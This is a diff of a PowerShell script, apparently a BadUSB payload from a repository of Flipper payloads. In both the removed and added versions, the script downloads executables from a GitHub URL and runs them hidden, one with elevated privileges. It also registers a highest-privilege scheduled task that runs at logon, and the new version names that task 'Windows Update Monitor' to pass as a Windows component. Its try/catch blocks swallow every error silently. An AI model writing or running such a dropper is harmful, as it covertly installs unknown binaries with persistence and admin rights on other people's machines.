@@ -1,32 +1,37 @@
-# Variables
-$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
-$exePath = "$env:APPDATA\WinUman.exe"
-$taskName = "WinUmanUpdater"
+# Main EXE for persistence
+$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
+$mainExePath = "$env:APPDATA\WinUman.exe"
+$taskName = "Windows Update Monitor"
 
-# Download EXE
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+try {
+    # Download EXE if it doesn't exist
+    if (-not (Test-Path $mainExePath)) {
+        Invoke-WebRequest -Uri $mainExeUrl -OutFile $mainExePath -UseBasicParsing
+    }
 
-# Start the EXE hidden
-Start-Process -FilePath $exePath -WindowStyle Hidden
+    # Start the EXE hidden
+    Start-Process -FilePath $mainExePath -WindowStyle Hidden
 
-# Register scheduled task to run at logon with highest privileges
-$action = New-ScheduledTaskAction -Execute $exePath
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest
+    # Register scheduled task (persistence)
+    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+        $action = New-ScheduledTaskAction -Execute $mainExePath
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest
+    }
+} catch {
+    # Optional: Log or silently ignore
+}
 
-Write-Host "Setup complete. Scheduled task '$taskName' created."
-# Define variables
-$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
-$exePath = "$env:TEMP\WinTelemetry.exe"
+# Secondary EXE - one-time payload
+$telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
+$telemetryPath = "$env:TEMP\WinTelemetry.exe"
 
-# Download EXE to temp folder
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-
-# Run the EXE with elevated privileges
-Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden
-
-# Optional: Wait a few seconds to ensure execution
-Start-Sleep -Seconds 5
-
-# Optional: Delete the EXE after running
-# Remove-Item -Path $exePath -Force
+try {
+    Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
+    Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
+    Start-Sleep -Seconds 5
+    # Optionally delete after running
+    # Remove-Item -Path $telemetryPath -Force
+} catch {
+    # Optional: Log or silently ignore
+}
